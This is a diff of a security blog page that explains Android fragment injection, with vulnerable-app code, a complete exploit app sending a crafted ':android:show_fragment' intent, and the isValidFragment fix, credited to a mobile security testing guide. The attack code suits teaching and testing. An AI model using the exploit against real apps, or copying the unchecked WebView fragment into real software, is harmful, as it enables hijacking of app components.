@@ -11,7 +11,7 @@
   <link href="/css/style-classic.css"></link>
   
   
-  <link rel="stylesheet" href="/css/style.min.957e71ad2cb873132802e19798d6ca577b82e708fa80d1e90b00bc9e23855023.css">
+  <link rel="stylesheet" href="/css/style.min.66ce8fff03ef375318be5d54765d5c0749bf4b361552834de057ae7105ddb079.css">
   
 
   
@@ -302,13 +302,13 @@ Activities</p>
 <p>⚠️ It&rsquo;s an old vulnerability that won&rsquo;t work with newer building tools. More about this vulnerability analysis <a href="/docs/blog/2020/09/how-i-fought-fragment-injection">here</a> in my blog post.</p>
 </blockquote>
 <p>Fragments require Reflection API. What&rsquo;s that? Compare two ways of instanciating a class:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// option 1
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Class</span> <span class="n">testClass</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CatsClass</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">// option 2
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">String</span> <span class="n">sClassName</span> <span class="o">=</span> <span class="s">&#34;android.app.CatsClass&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">Class</span> <span class="n">classToInvestigate</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">sClassName</span><span class="o">);</span>
-</span></span></code></pre></div><p>The second way uses a string with a class name to create a class. When using the regular (the first way), if <code>CatsClass</code> is not in Android SDK of certain version at runtime, the app crashes.  So, developers use reflection to check whether certain class/method/field etc exists at runtime. <a href="https://code.tutsplus.com/tutorials/learn-java-for-android-development-reflection-basics--mobile-3203">Here</a> is a good reference.</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">// option 1
+</span><span class="c1"></span><span class="n">Class</span> <span class="n">testClass</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CatsClass</span><span class="o">();</span>
+
+<span class="c1">// option 2
+</span><span class="c1"></span><span class="n">String</span> <span class="n">sClassName</span> <span class="o">=</span> <span class="s">&#34;android.app.CatsClass&#34;</span><span class="o">;</span>
+<span class="n">Class</span> <span class="n">classToInvestigate</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">sClassName</span><span class="o">);</span>
+</code></pre></div><p>The second way uses a string with a class name to create a class. When using the regular (the first way), if <code>CatsClass</code> is not in Android SDK of certain version at runtime, the app crashes.  So, developers use reflection to check whether certain class/method/field etc exists at runtime. <a href="https://code.tutsplus.com/tutorials/learn-java-for-android-development-reflection-basics--mobile-3203">Here</a> is a good reference.</p>
 <p>The code below was copied from <a href="https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05h-testing-platform-interaction#testing-for-fragment-injection-mstg-platform-2">Mobile Security Guide</a>. However, I&rsquo;ve edited the exploit. The basic idea behind the scenes is as follows. To acomplish this attack you need:</p>
 <ol>
 <li>Vulnerable application (SDK &lt; 19 and Android &lt; 4.4). Can be downloaded from <a href="https://github.com/clviper/android-fragment-injection">here</a>.
@@ -321,57 +321,57 @@ Activities</p>
 <li>Exploit application. Can be downloaded from <a href="https://github.com/clviper/android-fragment-injection">here</a>, but you can also create your own Android project in Android Studio (for Android 4.3 and SDK 18) and copy-paste the exploit code from below.</li>
 </ol>
 <p>Vulnerable application&rsquo;s Activity which <code>extends PreferenceActivity</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="n">PreferenceActivity</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></div><p>Actially this code will crash on a device, since there appears to be a slight protection: you cannot use <code>PreferenceActivity</code> extension on <code>MainActivity</code>. So, I&rsquo;ve created a separate <code>ExportedActivity</code> class. Vulnerable application&rsquo;s Fragment without protection. For example, a fragment below parses input string and opens the URL in WebView:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyFragment</span> <span class="kd">extends</span> <span class="n">Fragment</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span> <span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">View</span> <span class="nf">onCreateView</span><span class="o">(</span><span class="n">LayoutInflater</span> <span class="n">inflater</span><span class="o">,</span> <span class="n">ViewGroup</span> <span class="n">container</span><span class="o">,</span> <span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">View</span> <span class="n">v</span> <span class="o">=</span> <span class="n">inflater</span><span class="o">.</span><span class="na">inflate</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">fragmentLayout</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">WebView</span> <span class="n">myWebView</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebView</span><span class="o">)</span> <span class="n">wv</span><span class="o">.</span><span class="na">findViewById</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">webview</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">myWebView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">myWebView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getActivity</span><span class="o">().</span><span class="na">getIntent</span><span class="o">().</span><span class="na">getDataString</span><span class="o">());</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">v</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></div><p>Expoit application (create Empty Activity for Android for 4.3, API 18 and paste this code):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="n">AppCompatActivity</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">setContentView</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">fragmentInjection</span><span class="o">(</span><span class="s">&#34;pt.claudio.insecurefragment&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">                <span class="s">&#34;pt.claudio.insecurefragment.MainActivity&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">                <span class="s">&#34;pt.claudio.insecurefragment.MyFragment&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">                <span class="s">&#34;https://bakerst221b.com/docs/articles/mobile/android/complex-attacks/&#34;</span>
-</span></span><span class="line"><span class="cl">                <span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">fragmentInjection</span><span class="o">(</span><span class="n">String</span> <span class="n">victimPackage</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">                                     <span class="n">String</span> <span class="n">victimActivity</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">                                     <span class="n">String</span> <span class="n">victimFragment</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">                                     <span class="n">String</span> <span class="n">exploitString</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_ACTIVITY_CLEAR_TASK</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="n">victimPackage</span><span class="o">,</span><span class="n">victimActivity</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&#34;:android:show_fragment&#34;</span><span class="o">,</span><span class="n">victimFragment</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">exploitString</span><span class="o">));</span>
-</span></span><span class="line"><span class="cl">        <span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></div><p>To protect from this attack, add this code to the activity which <code>extends PreferenceActivity</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span>
-</span></span><span class="line"><span class="cl"><span class="kd">protected</span> <span class="kt">boolean</span> <span class="nf">isValidFragment</span><span class="o">(</span><span class="n">String</span> <span class="n">fragmentName</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">{</span>
-</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="s">&#34;com.fullpackage.MyPreferenceFragment&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">fragmentName</span><span class="o">);</span> <span class="c1">//here can be any name for legal fragment
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">}</span>
-</span></span></code></pre></div><p>All code is from <a href="https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05h-testing-platform-interaction#testing-for-fragment-injection-mstg-platform-2">Mobile SecGuide</a>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="n">PreferenceActivity</span> <span class="o">{</span>
+    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Actially this code will crash on a device, since there appears to be a slight protection: you cannot use <code>PreferenceActivity</code> extension on <code>MainActivity</code>. So, I&rsquo;ve created a separate <code>ExportedActivity</code> class. Vulnerable application&rsquo;s Fragment without protection. For example, a fragment below parses input string and opens the URL in WebView:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyFragment</span> <span class="kd">extends</span> <span class="n">Fragment</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span> <span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="n">View</span> <span class="nf">onCreateView</span><span class="o">(</span><span class="n">LayoutInflater</span> <span class="n">inflater</span><span class="o">,</span> <span class="n">ViewGroup</span> <span class="n">container</span><span class="o">,</span> <span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">View</span> <span class="n">v</span> <span class="o">=</span> <span class="n">inflater</span><span class="o">.</span><span class="na">inflate</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">fragmentLayout</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+        <span class="n">WebView</span> <span class="n">myWebView</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebView</span><span class="o">)</span> <span class="n">wv</span><span class="o">.</span><span class="na">findViewById</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">webview</span><span class="o">);</span>
+        <span class="n">myWebView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">myWebView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getActivity</span><span class="o">().</span><span class="na">getIntent</span><span class="o">().</span><span class="na">getDataString</span><span class="o">());</span>
+        <span class="k">return</span> <span class="n">v</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Expoit application (create Empty Activity for Android for 4.3, API 18 and paste this code):</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="n">AppCompatActivity</span> <span class="o">{</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+        <span class="n">fragmentInjection</span><span class="o">(</span><span class="s">&#34;pt.claudio.insecurefragment&#34;</span><span class="o">,</span>
+                <span class="s">&#34;pt.claudio.insecurefragment.MainActivity&#34;</span><span class="o">,</span>
+                <span class="s">&#34;pt.claudio.insecurefragment.MyFragment&#34;</span><span class="o">,</span>
+                <span class="s">&#34;https://bakerst221b.com/docs/articles/mobile/android/complex-attacks/&#34;</span>
+                <span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">fragmentInjection</span><span class="o">(</span><span class="n">String</span> <span class="n">victimPackage</span><span class="o">,</span>
+                                     <span class="n">String</span> <span class="n">victimActivity</span><span class="o">,</span>
+                                     <span class="n">String</span> <span class="n">victimFragment</span><span class="o">,</span>
+                                     <span class="n">String</span> <span class="n">exploitString</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
+        <span class="n">i</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_ACTIVITY_CLEAR_TASK</span><span class="o">);</span>
+        <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="n">victimPackage</span><span class="o">,</span><span class="n">victimActivity</span><span class="o">);</span>
+        <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&#34;:android:show_fragment&#34;</span><span class="o">,</span><span class="n">victimFragment</span><span class="o">);</span>
+        <span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">exploitString</span><span class="o">));</span>
+        <span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>To protect from this attack, add this code to the activity which <code>extends PreferenceActivity</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="nd">@Override</span>
+<span class="kd">protected</span> <span class="kt">boolean</span> <span class="nf">isValidFragment</span><span class="o">(</span><span class="n">String</span> <span class="n">fragmentName</span><span class="o">)</span>
+<span class="o">{</span>
+<span class="k">return</span> <span class="s">&#34;com.fullpackage.MyPreferenceFragment&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">fragmentName</span><span class="o">);</span> <span class="c1">//here can be any name for legal fragment
+</span><span class="c1"></span><span class="o">}</span>
+</code></pre></div><p>All code is from <a href="https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05h-testing-platform-interaction#testing-for-fragment-injection-mstg-platform-2">Mobile SecGuide</a>.</p>
 <h2 id="ios">iOS</h2>
 <p>iOS IPC is arguably much poorer than the Android&rsquo;s. That leads to less exposure on that frontline.</p>
 <h2 id="references">References</h2>
@@ -407,7 +407,7 @@ Activities</p>
   
 
   
-  <script type="text/javascript" src="/js/scripts.min.bafc052229b4b40bf03c477d31c5cdd9352ece8afbadf35ab97ed14495098fc9.js"></script>
+  <script type="text/javascript" src="/js/scripts.min.1237ff71925bb8625c97a9af8db4c54525258bedfd7c47493daaff723bea755e.js"></script>
   
 
   
